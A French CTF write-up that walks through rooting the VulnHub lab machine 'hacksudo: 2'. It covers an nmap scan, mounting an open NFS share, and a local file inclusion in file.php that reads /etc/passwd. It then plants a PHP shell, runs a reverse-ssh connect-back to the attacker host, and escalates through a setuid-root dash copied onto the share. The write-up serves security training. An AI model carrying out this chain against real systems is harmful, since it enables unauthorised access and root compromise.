---
title: Solution du CTF hacksudo #2 (HackDudo) de VulnHub
tags: [CTF, VulnHub]
---

### hacksudo: 2 (HackDudo)

[hacksudo: 2 (HackDudo) ](https://vulnhub.com/entry/hacksudo-2-hackdudo,667/) est un CTF simple et très classique. Les habitués de CTFs n'apprendront sans doute rien. À réserver aux nouveaux.

```console
$ sudo nmap -sCV --script vuln -T5 -p- 192.168.56.132
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.132
Host is up (0.00021s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.46 ((Ubuntu))
| vulners: 
|   cpe:/a:apache:http_server:2.4.46: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
|       PACKETSTORM:176334      9.8     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
|       PACKETSTORM:171631      9.8     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-       9.8     https://vulners.com/metasploit/MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-        *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-       9.8     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-        *EXPLOIT*
--- snip ---
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Apache/2.4.46 (Ubuntu)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /test.html: Test page
|   /info.php: Possible information file
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.46 (ubuntu)'
|   /lib/: Potentially interesting directory w/ listing on 'apache/2.4.46 (ubuntu)'
|_  /web/: Potentially interesting directory w/ listing on 'apache/2.4.46 (ubuntu)'
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.56.132:80/lib/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.132:80/lib/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.56.132:80/lib/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.132:80/lib/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.132:80/lib/audiojs/12?playerInstance=%27%20OR%20sqlspider
|     http://192.168.56.132:80/lib/script/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.132:80/lib/script/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.132:80/lib/script/?C=N%3BO%3DD%27%20OR%20sqlspider
|_    http://192.168.56.132:80/lib/script/?C=D%3BO%3DA%27%20OR%20sqlspider
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|_  100021  1,3,4      43221/tcp6  nlockmgr
1337/tcp  open  ssh      OpenSSH 8.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.3p1: 
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       PACKETSTORM:173661      9.8     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    9.8     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
|       B8190CDB-3EB9-5631-9828-8064A1575B23    9.8     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23  *EXPLOIT*
|       8FC9C5AB-3968-5F3C-825E-E8DB5379A623    9.8     https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623  *EXPLOIT*
|       8AD01159-548E-546E-AA87-2DE89F3927EC    9.8     https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC  *EXPLOIT*
|       2227729D-6700-5C8F-8930-1EEAFD4B9FF0    9.8     https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0  *EXPLOIT*
|       0221525F-07F5-5790-912D-F4B9E2D1B587    9.8     https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587  *EXPLOIT*
|       CVE-2020-15778  7.8     https://vulners.com/cve/CVE-2020-15778
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    7.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3  *EXPLOIT*
|       10213DBE-F683-58BB-B6D3-353173626207    7.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207  *EXPLOIT*
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT*
|       CVE-2021-28041  7.1     https://vulners.com/cve/CVE-2021-28041
|       CVE-2021-41617  7.0     https://vulners.com/cve/CVE-2021-41617
|       PACKETSTORM:189283      6.8     https://vulners.com/packetstorm/PACKETSTORM:189283      *EXPLOIT*
|       F79E574D-30C8-5C52-A801-66FFA0610BAA    6.8     https://vulners.com/githubexploit/F79E574D-30C8-5C52-A801-66FFA0610BAA  *EXPLOIT*
|       CVE-2025-26465  6.8     https://vulners.com/cve/CVE-2025-26465
|       9D8432B9-49EC-5F45-BB96-329B1F2B2254    6.8     https://vulners.com/githubexploit/9D8432B9-49EC-5F45-BB96-329B1F2B2254  *EXPLOIT*
|       1337DAY-ID-39918        6.8     https://vulners.com/zdt/1337DAY-ID-39918        *EXPLOIT*
|       CVE-2023-51385  6.5     https://vulners.com/cve/CVE-2023-51385
|       CVE-2023-48795  5.9     https://vulners.com/cve/CVE-2023-48795
|       CVE-2020-14145  5.9     https://vulners.com/cve/CVE-2020-14145
|       CC3AE4FC-CF04-5EDA-A010-6D7E71538C92    5.9     https://vulners.com/githubexploit/CC3AE4FC-CF04-5EDA-A010-6D7E71538C92  *EXPLOIT*
|       54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C    5.9     https://vulners.com/githubexploit/54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C  *EXPLOIT*
|       CVE-2016-20012  5.3     https://vulners.com/cve/CVE-2016-20012
|       CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|_      PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
2049/tcp  open  nfs      3-4 (RPC #100003)
33667/tcp open  nlockmgr 1-4 (RPC #100021)
48303/tcp open  mountd   1-3 (RPC #100005)
58587/tcp open  mountd   1-3 (RPC #100005)
60297/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 08:00:27:5D:2D:E0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.67 seconds
```

Les deux points intéressants sur ce scan sont :

* la présence d'un PHPInfo (dans `info.php`) indiquant que le système est du `x86_64`

* la présence du port NFS ouvert

On va donc directement lister les partages NFS et voir si on peut en monter un :

```console
$ showmount -e 192.168.56.132
Export list for 192.168.56.132:
/mnt/nfs *
$ sudo mount 192.168.56.132:/mnt/nfs /mnt/
$ ls /mnt/ -al
total 8
drwxr-xr-x 2 root root 4096 16 mars   2021 .
drwxr-xr-x 1 root root  160 30 juin  07:40 ..
-rw-r--r-- 1 root root   25 16 mars   2021 flag1.txt
$ cat /mnt/flag1.txt 
now root this system !!!
```

J'ai ensuite énuméré les fichiers et dossiers sur le serveur web et j'ai trouvé un script `file.php` prometteur :

```console
$ feroxbuster -u http://192.168.56.132/ -w DirBuster-0.12/directory-list-2.3-big.txt -n -x php,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.132/
 🚀  Threads               │ 50
 📖  Wordlist              │ DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [php, html]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      951l     4806w        0c http://192.168.56.132/info.php
301        9l       28w      314c http://192.168.56.132/web
301        9l       28w      316c http://192.168.56.132/audio
301        9l       28w      314c http://192.168.56.132/css
200      143l      334w     3064c http://192.168.56.132/test.html
200     1377l     3467w    32472c http://192.168.56.132/game.html
301        9l       28w      314c http://192.168.56.132/lib
200        7l       14w      238c http://192.168.56.132/file.php
200       48l      134w     1587c http://192.168.56.132/index.html
301        9l       28w      316c http://192.168.56.132/tiles
403        9l       28w      279c http://192.168.56.132/server-status
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_56_132_-1751981057.state ...
[##>-----------------] - 1m    450441/3820686 7m      found:11      errors:0      
[##>-----------------] - 1m    450393/3820686 7169/s  http://192.168.56.132/
```

La page mentionne `file access`, c'est explicite :

```console
$ curl -s http://192.168.56.132/file.php
<html>
<head><title>hacksudo file access</title></head>
<body style="background-color:powderblue;">
<h1><marquee>hacksudo FILe access</marquee></h1>
<br><center><a href="https://hacksudo.com">hacksudo WEBSITE</a></center>
</body>
</html>
```

On tente directement une inclusion avec le paramètre `file`, et ça marche :

```console
$ curl -s 'http://192.168.56.132/file.php?file=/etc/passwd'
<html>
<head><title>hacksudo file access</title></head>
<body style="background-color:powderblue;">
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
--- snip ---
hacksudo:x:1000:1000:hacksudo:/home/hacksudo:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
_rpc:x:113:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:114:65534::/var/lib/nfs:/usr/sbin/nologin
<h1><marquee>hacksudo FILe access</marquee></h1>
<br><center><a href="https://hacksudo.com">hacksudo WEBSITE</a></center>
</body>
</html>
```

L'exploitation sera très aisée si on peut charger les fichiers depuis le partage NFS. Et c'est le cas :

```console
$ curl -s 'http://192.168.56.132/file.php?file=/mnt/nfs/flag1.txt'
<html>
<head><title>hacksudo file access</title></head>
<body style="background-color:powderblue;">
now root this system !!!
<h1><marquee>hacksudo FILe access</marquee></h1>
<br><center><a href="https://hacksudo.com">hacksudo WEBSITE</a></center>
</body>
</html>
```

J'en profite donc pour y copier :

* un shell PHP

* `reverse-sshx64`

Avec le shell PHP, j'ai exécuté le `reverse-ssh` en mode connect-back (il faudra d'abord le lancer en mode serveur sur sa machine) :

```bash
nohup /mnt/nfs/reverse-sshx64 -p 80 192.168.56.1
```

Le scénario classique pour NFS est ensuite de placer une backdoor setuid root. Comme le CTF date de 2021, je ne vais prendre le risque de copier un exécutable de mon système (version de la libc potentiellement incompatible).

Je préfère copier `dash` vers la racine web :

```console
www-data@hacksudo:/mnt/nfs$ cp /bin/dash /var/www/html/
```

De ma machine, je le télécharge puis, je le replace vers le partage NFS en setuid root :

```console
$ wget http://192.168.56.132/dash
$ sudo cp dash /mnt/
$ sudo chown root:root /mnt/dash
$ sudo chmod 4755 /mnt/dash
```

Et c'est game over :

```console
www-data@hacksudo:/mnt/nfs$ ./dash -p
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# cd /root
# ls
root.txt  snap
# cat root.txt  
rooted!!!
| |__   __ _  ___| | _____ _   _  __| | ___         ___ ___  _ __ ___  
| '_ \ / _` |/ __| |/ / __| | | |/ _` |/ _ \       / __/ _ \| '_ ` _ \ 
| | | | (_| | (__|   <\__ \ |_| | (_| | (_) |  _  | (_| (_) | | | | | |
|_| |_|\__,_|\___|_|\_\___/\__,_|\__,_|\___/  (_)  \___\___/|_| |_| |_|
www.hacksudo.com
```


